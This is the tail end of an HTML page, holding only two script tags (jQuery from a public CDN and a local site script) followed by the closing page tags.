<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>





<script src="/js/script.js"></script>


</div>
</body>
</html>
